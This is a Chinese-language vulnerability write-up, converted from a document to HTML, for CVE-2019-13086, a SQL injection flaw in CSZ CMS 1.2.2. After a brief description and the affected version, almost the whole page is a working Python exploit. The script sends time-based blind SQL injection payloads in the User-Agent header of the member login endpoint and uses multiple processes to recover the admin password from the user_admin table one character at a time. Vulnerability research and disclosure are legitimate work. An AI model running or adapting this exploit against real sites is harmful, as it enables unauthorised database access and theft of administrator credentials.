<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-13086）CSZ CMS 1.2.2 sql注入漏洞</h1><h2>一、漏洞简介</h2><p>CSZ CMS是一套基于PHP的开源内容管理系统（CMS）。 CSZ CMS 1.2.2版本（2019-06-20之前）中的core/MY_Security.php文件存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。</p><h2>二、漏洞影响</h2><p>CSZ CMS 1.2.2版本（2019-06-20之前）</p><h2>三、复现过程</h2><h3>poc</h3><p>import requests<br />import time<br />import threading<br />import multiprocessing<br /><br />pool="admin$ABCDEFGHIJKLMNOPQRSTUVWXYZ"+" "+"bcefghjklopqrstuvwxyz1234567890/."<br />mutex=0<br /><br />#获取长度用的User-Agent模板<br />ual=&quot;'-(if((length((select name from user_admin limit 1))=10),sleep(5),1))-'', '127.0.0.1','time') #&quot;<br /><br /><br />#&quot;Why don't you just build something&quot;<br />#----------------------------------------------------获取管理员用户名长度--------------------------------------------<br />def getlength(field,tbname,total):<br />    ual_head=&quot;'-(if((length((select &quot;     #这些空格一定要保留<br />    ual_middle=" limit 1))="<br />    num=1<br />    ual_last=&quot;),sleep(5),1))-'', '127.0.0.1','time') #&quot;<br /><br />    datas={'email':'111@111.com',<br />        'password':'111'<br />    }<br />    <br />    header={'Host': 'localhost',<br />            'Content-Length': '74',<br />            'Cache-Control': 'max-age=0',<br />            'Origin': 'http://localhost',<br />            'Upgrade-Insecure-Requests': '1',<br />            'Content-Type': 'application/x-www-form-urlencoded',<br />            'User-Agent': ual,<br />            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',<br />            'Referer': 'http://localhost/cszcms/member/login',<br />            'Accept-Encoding': 'gzip, deflate',<br />            'Accept-Language': 'zh-CN,zh;q=0.9',<br />            'Connection': 'close'}<br /><br />    starttime=time.time()<br />    for num in range(total):<br />        header['User-Agent']=ual_head+field+&quot; from &quot;+tbname+ual_middle+str(num)+ual_last<br />        #print(header['User-Agent'])<br />        sendtime=time.time()<br />        response=requests.post(r"http://localhost/cszcms/member/login/check/post",data=datas,headers=header)<br />        recvtime=time.time()<br /><br />        doesitwork=recvtime-sendtime<br />        if(doesitwork&gt;5):<br />            print("The length is",num)<br />            print("This step cost:",time.time()-starttime)<br />            return num<br />            break<br />        if(num==total-1):<br />            return 0<br /><br />#获取内容用的User-Agent模板<br />ua=&quot;'-(if((ascii(substr((select name from user_admin limit 1), 1, 1))=97),sleep(5),1))-'', '127.0.0.1','time') #&quot;<br />        <br />#-----------------------------------------------------获取管理员用户名--------------------------------------------<br />def getcontent(field,tbname,num,qr,lock):<br /><br />    #print(num)<br />    pool="@.tescomadin$ABCDEFGHIJKLMNOPQRSTUVWXYZ"+" "+"bcefghjklpqrstuvwxyz1234567890/."<br />    <br />    result=[]<br />    <br />    ua_head=&quot;'-(if((ascii(substr((select &quot;<br />    ua_front=" limit 1), "<br />    ua_middle=", 1))="<br />    char="A"<br />    ua_last=&quot;),sleep(5),1))-'', '127.0.0.1','time') #&quot;<br /><br />    datas={'email':'111@111.com',<br />        'password':'111'<br />    }<br />    <br />    header={'Host': 'localhost',<br />            'Content-Length': '74',<br />            'Cache-Control': 'max-age=0',<br />            'Origin': 'http://localhost',<br />            'Upgrade-Insecure-Requests': '1',<br />            'Content-Type': 'application/x-www-form-urlencoded',<br />            'User-Agent': ua,<br />            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',<br />            'Referer': 'http://localhost/cszcms/member/login',<br />            'Accept-Encoding': 'gzip, deflate',<br />            'Accept-Language': 'zh-CN,zh;q=0.9',<br />            'Connection': 'close'}<br />    <br />    for i in range(1):<br />        for char in pool:<br />            header['User-Agent']=ua_head+field+&quot; from &quot;+tbname+ua_front+str(num+1)+ua_middle+str(ord(char))+ua_last<br />            #print(header['User-Agent'])<br />            <br />            lock.acquire()<br />            sendtime=time.time()<br />            response=requests.post(r"http://localhost/cszcms/member/login/check/post",data=datas,headers=header)<br />            lock.release()<br />            <br />            recvtime=time.time()<br /><br />            doesitwork=recvtime-sendtime<br />            if(doesitwork&gt;5):<br />                #print("It cost:",doesitwork)<br />                print(num," got:",char)<br />                #adminnamelist[num]=char    <br />                result=[num,char]<br />                qr.put(result)<br />                break<br />    <br />#---------------------------------------------现在！让我们重新揭起救世的大旗！------------------------------------<br /><br />if __name__=='__main__':<br /><br />    qr=multiprocessing.Queue()<br />    lock=multiprocessing.Lock()<br />    <br />    field="password"<br />    tbname="user_admin"<br /><br />    adminname=""<br />    adminpwd=""<br /><br />    getresult=[]<br />    <br />    #调用获得长度的函数<br />    length=getlength(field,tbname,100)  <br />    print("length is",length)<br /><br />    processes=[]<br /><br /><br />    #开线程分别对每个字符匹配<br />    timehead=time.time()<br /><br />    for ti in range(length):<br />        processes.append(multiprocessing.Process(target=getcontent,args=(field,tbname,ti,qr,lock)))<br />        processes[ti].start()<br /><br />    for ti in range(length):<br />        processes[ti].join()<br />        <br />    fout=open(field+"out.txt","w+")<br />    for ci in range(length):<br />        getresult.append(qr.get())<br />    print(getresult)<br />    for ci in range(length):<br />        for result in getresult:<br />            if(result[0]==ci):<br />                print(result[1])<br />                adminname+=result[1]<br />                <br />    fout.write(adminname)<br />    print(field,":",adminname)<br />    fout.close()<br />    print("It took:",time.time()-timehead)</p></body></html>